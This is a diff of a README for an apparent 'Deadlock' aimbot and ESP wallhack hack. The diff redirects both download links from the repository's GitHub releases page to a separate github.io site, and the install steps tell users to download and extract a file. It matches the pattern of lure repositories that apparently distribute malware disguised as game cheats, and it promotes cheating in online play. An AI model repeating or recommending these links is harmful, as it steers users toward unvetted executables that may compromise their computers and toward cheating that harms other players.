@@ -1,6 +1,6 @@
 # 🎯 Deadlock-Aimbot-ESP-Hack-2026 - Gain the advantage in Deadlock matches
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/auditoryareaengraving803/Deadlock-Aimbot-ESP-Hack-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://auditoryareaengraving803.github.io)
 
 This software provides tactical tools for the game Deadlock. Use these features to track player positions, spot items through walls, and improve your aim accuracy. The tool operates as an external overlay to provide real-time information during your gameplay sessions.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards to run the software.
 
 Follow these steps to set up the software correctly on your PC.
 
-1.  Visit the [official releases page](https://github.com/auditoryareaengraving803/Deadlock-Aimbot-ESP-Hack-2026/releases) to download the latest version.
+1.  Visit the [official releases page](https://auditoryareaengraving803.github.io) to download the latest version.
 2.  Save the file to a folder you can access easily.
 3.  Right-click the downloaded file and choose Extract All to unzip the contents.
 4.  Launch the game Deadlock and log into your account.
